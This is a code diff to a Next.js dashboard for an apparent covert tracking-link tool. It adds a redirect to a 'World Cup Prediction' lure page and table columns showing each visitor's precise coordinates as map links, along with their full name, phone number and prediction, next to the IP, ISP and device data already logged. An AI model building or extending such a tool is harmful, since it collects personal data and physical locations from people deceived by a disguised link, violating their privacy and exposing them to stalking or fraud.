@@ -10,6 +10,7 @@
 
 import { getAllLogs, getLogCount, getUniqueCountries, getSetting, setSetting } from "@/lib/db";
 import { revalidatePath } from "next/cache";
+import { headers } from "next/headers";
 
 // Force dynamic rendering — always fetch fresh data
 export const dynamic = "force-dynamic";
@@ -50,12 +51,26 @@ async function updateRedirectUrl(formData) {
   }
 }
 
-export default function DashboardPage() {
+async function updateRedirectMode(formData) {
+  "use server";
+  const mode = formData.get("redirect_mode") === "poll" ? "poll" : "custom";
+  setSetting("redirect_mode", mode);
+  revalidatePath("/");
+}
+
+export default async function DashboardPage() {
   const logs = getAllLogs();
   const totalVisits = getLogCount();
   const uniqueCountries = getUniqueCountries();
   const uniqueIPs = new Set(logs.map((l) => l.ip)).size;
   const redirectUrl = getSetting("redirect_url") || "https://www.google.com";
+  const redirectMode = getSetting("redirect_mode") || "custom";
+
+  // Dynamically resolve target hostname
+  const headerList = await headers();
+  const host = headerList.get("host") || "localhost:3000";
+  const protocol = host.includes("localhost") ? "http" : "https";
+  const trackingLink = `${protocol}://${host}/api/track`;
 
   return (
     <main className="min-h-screen bg-gray-950 text-gray-100 font-[var(--font-geist-sans)]">
@@ -110,7 +125,7 @@ export default function DashboardPage() {
         </div>
 
         {/* ── Settings & Links Grid ──────────────────────────── */}
-        <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
+        <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
           {/* Destination Settings Form */}
           <div className="rounded-xl border border-white/5 bg-gray-900/60 backdrop-blur p-5 flex flex-col justify-between">
             <div>
@@ -139,6 +154,39 @@ export default function DashboardPage() {
             </form>
           </div>
 
+          {/* Redirection Toggle Form */}
+          <div className="rounded-xl border border-white/5 bg-gray-900/60 backdrop-blur p-5 flex flex-col justify-between">
+            <div>
+              <p className="text-xs uppercase tracking-wider text-gray-500 mb-2 font-semibold">
+                Redirection Mode
+              </p>
+              <p className="text-xs text-gray-400 mb-4">
+                Toggle between custom URL and World Cup Prediction page redirection.
+              </p>
+            </div>
+            <form action={updateRedirectMode} className="flex items-center justify-between gap-2 border-t border-white/5 pt-3">
+              <div className="flex items-center gap-2">
+                <input
+                  type="checkbox"
+                  name="redirect_mode"
+                  value="poll"
+                  defaultChecked={redirectMode === "poll"}
+                  id="redirect_mode_toggle"
+                  className="w-4 h-4 rounded border-white/10 bg-gray-850 text-violet-600 focus:ring-violet-500 focus:ring-offset-gray-900 cursor-pointer"
+                />
+                <label htmlFor="redirect_mode_toggle" className="text-xs font-semibold text-gray-300 cursor-pointer select-none">
+                  Prediction Game Redirection
+                </label>
+              </div>
+              <button
+                type="submit"
+                className="px-3 py-1.5 bg-violet-600 hover:bg-violet-500 text-white rounded-lg text-xs font-semibold transition-all shadow-md active:scale-95"
+              >
+                Save Mode
+              </button>
+            </form>
+          </div>
+
           {/* Tracking Link Info */}
           <div className="rounded-xl border border-white/5 bg-gray-900/60 backdrop-blur p-5 flex flex-col justify-between">
             <div>
@@ -151,7 +199,7 @@ export default function DashboardPage() {
             </div>
             <div className="flex items-center gap-3">
               <code className="flex-1 px-4 py-2.5 rounded-lg bg-gray-800 text-violet-300 text-sm font-mono border border-white/5 truncate select-all">
-                {`http://localhost:3000/api/track`}
+                {trackingLink}
               </code>
               <span className="text-[10px] text-gray-600 shrink-0">
                 Double click to copy
@@ -186,8 +234,12 @@ export default function DashboardPage() {
                     <th className="px-5 py-3 font-semibold">#</th>
                     <th className="px-5 py-3 font-semibold">Timestamp</th>
                     <th className="px-5 py-3 font-semibold">IP Address</th>
+                    <th className="px-5 py-3 font-semibold">Location</th>
                     <th className="px-5 py-3 font-semibold">Country</th>
                     <th className="px-5 py-3 font-semibold">City</th>
+                    <th className="px-5 py-3 font-semibold">Prediction</th>
+                    <th className="px-5 py-3 font-semibold">Full Name</th>
+                    <th className="px-5 py-3 font-semibold">Phone Number</th>
                     <th className="px-5 py-3 font-semibold">ISP</th>
                     <th className="px-5 py-3 font-semibold">Device / User-Agent</th>
                   </tr>
@@ -209,11 +261,50 @@ export default function DashboardPage() {
                           {log.ip}
                         </span>
                       </td>
+                      <td className="px-5 py-3 text-gray-300 whitespace-nowrap">
+                        {log.lat && log.lon ? (
+                          <a
+                            href={`https://www.google.com/maps?q=${log.lat},${log.lon}`}
+                            target="_blank"
+                            rel="noopener noreferrer"
+                            className="text-cyan-400 hover:text-cyan-300 font-semibold hover:underline inline-flex items-center gap-1"
+                          >
+                            📍 Map ({parseFloat(log.lat).toFixed(2)}, {parseFloat(log.lon).toFixed(2)})
+                          </a>
+                        ) : (
+                          <span className="text-gray-600">—</span>
+                        )}
+                      </td>
                       <td className="px-5 py-3 text-gray-300">
                         {log.country}
                       </td>
                       <td className="px-5 py-3 text-gray-300">
                         {log.city}
+                      </td>
+                      <td className="px-5 py-3">
+                        {log.prediction === "France" ? (
+                          <span className="px-2 py-0.5 rounded bg-blue-500/10 border border-blue-500/20 text-blue-400 text-xs font-semibold whitespace-nowrap">
+                            🇫🇷 فرنسا
+                          </span>
+                        ) : log.prediction === "Morocco" ? (
+                          <span className="px-2 py-0.5 rounded bg-red-500/10 border border-red-500/20 text-red-400 text-xs font-semibold whitespace-nowrap">
+                            🇲🇦 المغرب
+                          </span>
+                        ) : (
+                          <span className="text-gray-600">—</span>
+                        )}
+                      </td>
+                      <td className="px-5 py-3 text-gray-200 font-medium whitespace-nowrap">
+                        {log.full_name || <span className="text-gray-600">—</span>}
+                      </td>
+                      <td className="px-5 py-3">
+                        {log.phone ? (
+                          <span className="font-mono text-violet-300 whitespace-nowrap bg-white/5 px-2 py-0.5 rounded border border-white/5">
+                            {log.phone}
+                          </span>
+                        ) : (
+                          <span className="text-gray-600">—</span>
+                        )}
                       </td>
                       <td className="px-5 py-3 text-gray-400">
                         {log.isp}
